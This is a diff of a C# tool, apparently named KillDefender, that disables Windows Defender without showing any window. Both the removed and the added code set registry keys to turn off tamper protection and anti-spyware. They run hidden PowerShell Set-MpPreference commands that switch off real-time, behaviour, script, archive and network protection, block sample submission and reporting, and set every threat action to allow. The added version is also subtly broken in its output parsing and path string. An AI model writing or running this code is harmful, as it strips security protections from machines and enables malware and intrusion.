@@ -6,110 +6,13 @@ using System.IO;
 using System.Net;
 using System.Http;
 
-namespace Disable_Windows_Defender
+namespace KillDefender
 {
-    class Program
+    class execute 
     {
-        static void Main()
-        {
-            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
-
-            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
-
-            CheckDefender();
-        }
-
-        private static void RegistryEdit(string regPath, string name, string value)
-        {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
-                {
-                    if (key == null)
-                    {
-                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
-                        return;
-                    }
-                    if (key.GetValue(name) != (object)value)
-                        key.SetValue(name, value, RegistryValueKind.DWord);
-                }
-            }
-            catch { }
-        }
-        private static void CheckDefender()
-        {
-            Process proc = new Process
-            {
-                StartInfo = new ProcessStartInfo
-                {
-                    FileName = "powershell",
-                    Arguments = "Get-MpPreference -verbose",
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true
-                }
-            };
-            proc.Start();
-            string line = proc.StandardOutput.ReadLine();
-            while (!proc.StandardOutput.EndOfStream)
-            {
-                string line = proc.StandardOutput.ReadLine();
-
-                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
-
-                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
-
-                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
-
-                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableIOAVProtection $true");
-
-                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisablePrivacyMode $true");
-
-                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
-
-                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); 
-
-                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 
-
-                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
-                    RunPS("Set-MpPreference -DisableScriptScanning $true"); 
-
-                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
-                    RunPS("Set-MpPreference -SubmitSamplesConsent 2");  
-
-                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
-                    RunPS("Set-MpPreference -MAPSReporting 0");  
-
-                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
-                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); 
-
-                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
-                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); 
-
-                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
-                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // 
-
-                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
-                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); 
-            }
-        }
-
         private static void RunPS(string args)
         {
-            Process proc = new Process
+            Process process = new Process
             {
                 StartInfo = new ProcessStartInfo
                 {
@@ -119,7 +22,7 @@ namespace Disable_Windows_Defender
                     CreateNoWindow = true
                 }
             };
-            proc.Start();
+            process.Start();
         }
         public static void RunCMD(string command)
         {
@@ -137,6 +40,47 @@ namespace Disable_Windows_Defender
             };
             proc.Start();
         }
+    }
+    class Program
+    {
+        static void Main()
+        {
+            CheckDefender();
+        }
+        private static void CheckDefender()
+        {
+            Process proc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
+                    Arguments = "Get-MpPreference -verbose",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                }
+            };
+            proc.Start();
+            string output = proc.StandardOutput.ReadLine();
+            string line = proc.StandardOutput.ReadLine();
 
+            if (output.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
+            if (output.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
+            if (output.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
+            if (output.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableIOAVProtection $true");
+            if (output.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisablePrivacyMode $true");
+            if (output.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
+            if (output.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableArchiveScanning $true");
+            if (output.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); 
+            if (output.StartsWith(@"DisableScriptScanning") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableScriptScanning $true"); 
+            if (output.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2")) execute.RunPS("Set-MpPreference -SubmitSamplesConsent 2");  
+            if (output.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))execute.RunPS("Set-MpPreference -MAPSReporting 0");  
+
+            if (output.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); 
+            if (output.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); 
+            if (output.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -LowThreatDefaultAction 6");
+            if (output.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); 
+        }
     }
 }
